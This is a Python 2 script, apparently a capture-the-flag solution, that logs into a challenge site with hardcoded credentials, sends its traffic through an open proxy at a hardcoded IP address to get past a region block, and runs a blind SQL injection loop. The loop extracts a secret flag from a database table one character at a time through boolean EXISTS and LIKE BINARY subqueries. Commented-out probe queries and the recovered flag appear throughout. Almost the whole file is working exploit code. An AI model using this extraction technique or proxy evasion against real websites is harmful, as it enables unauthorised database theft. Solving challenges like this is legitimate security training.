import httplib2
import urllib
import urllib2

h = httplib2.Http()
#httplib2.debuglevel = 1 

''' get set-cookie form server header '''
url = 'http://tor.atdog.tw/users/signin'
response, content = h.request(url, method="GET")
headers = {'Cookie': "netseer_cm=done; " + response['set-cookie']}
print response['set-cookie']
print headers

''' Parse authenticity_token '''
authenticity_token = content.split("<meta content=\"")[2]
authenticity_token = authenticity_token[0:44]

''' Login '''
url = 'http://tor.atdog.tw/users/login'
body = {'user[username]': 'ggg', 'user[password]': '123456', 'authenticity_token' : authenticity_token}
response, content = h.request(url, 'POST', headers=headers, body=urllib.urlencode(body))
#print content

''' Can't Assess Page, need HK IP '''
url = 'http://tor.atdog.tw/news/1'
headers = {'Cookie': "netseer_cm=done; " + response['set-cookie']}
response, content = h.request(url, method="GET", headers=headers)
#print content

''' BSQLi '''
url = 'http://tor.atdog.tw/news/1'
query = '=(EXISTS(SELECT flag FROM flags))'
# query = '=(EXISTS(SELECT flag FROM flags WHERE flag like BINARY "SECPROC{Hey_%"))'
# query = '=(EXISTS(SELECT flag FROM flags where substring(flag,1,1) = "S"))'
# query = '=(EXISTS(SELECT flag FROM flags where substring(flag,25,1) = substring(flag,18,1)))'
# query = '=(EXISTS(SELECT flag FROM flags where ascii(substr(flag,1,1))-ascii(substr(flag,2,1)) = 14))'
# query = '=(EXISTS(SELECT flag FROM flags where ascii("S") - ascii("E") = 14))'
# query = '=(EXISTS(SELECT flag FROM flags where ascii("S") = 83))'
# query = '=(EXISTS(SELECT flag FROM flags where substring(hex(flag),1,2) = 53))'
# query = '=(EXISTS(SELECT flag FROM flags where substring(flag,1,54) = "SECPROC{Hey,D0n't_f0rg3t_g0_thr0ugh_an0nymity_n3tw0rk_"))'
''' proxy to HK '''
proxy = urllib2.ProxyHandler({'http': '110.173.49.18:3128'})
opener = urllib2.build_opener(proxy)
try:
    urllib2.install_opener(opener)
    request = urllib2.Request(url + urllib.quote(query), headers=headers)
    content = urllib2.urlopen(request).read()
except urllib2.HTTPError, error:
    content = error.read()
print content

''' Start Loop '''
#"SECPROC{Hey,D0n't_f0rg3t_g0_thr0ugh_an0nymity_n3tw0rk.}"
index = 0
baseStr = "SECPROC{Hey,D0n't_f0rg3t_g0_thr0ugh_an0nymity_n3tw0rk"
baseStr = "SE"
# can't add "." you have to replace "_" to "." on your own
testCharacter="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890~|\!@$^&*()'-?,;:-+={}[]<>#_"
url = 'http://tor.atdog.tw/news/1'
while index < len(testCharacter):
    query = "=(EXISTS(SELECT flag FROM flags WHERE flag like BINARY \"" + baseStr + testCharacter[index] + "%\"))"
    print url+query
    try:
        urllib2.install_opener(opener)
        request = urllib2.Request(url + urllib.quote(query), headers=headers)
        content = urllib2.urlopen(request).read()
    except urllib2.HTTPError, error:
        content = error.read()
        request = urllib2.Request(url, headers=headers)
        content = urllib2.urlopen(request).read()
    if "Web attacks build on Shellshock bug" in str(content):
        baseStr += testCharacter[index];
        print("Guess Password: " + baseStr)
        index = 0
        continue
    index += 1
print("Final Password: " + baseStr)
